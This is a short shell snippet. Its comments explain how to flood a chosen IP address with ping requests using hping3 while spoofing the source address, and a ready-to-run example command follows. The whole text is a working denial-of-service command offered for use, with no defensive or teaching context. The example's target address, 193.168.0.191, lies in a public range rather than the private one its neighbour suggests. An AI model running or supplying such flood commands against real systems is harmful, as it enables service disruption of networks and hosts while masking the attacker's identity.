#if u want to flood the IP x.x.x.x with ping requests originating from IP y.y.y.y type
#hping3 -1 --flood -a y.y.y.y x.x.x.x

#example:

hping3 -1 --flood -a 192.168.0.193 193.168.0.191


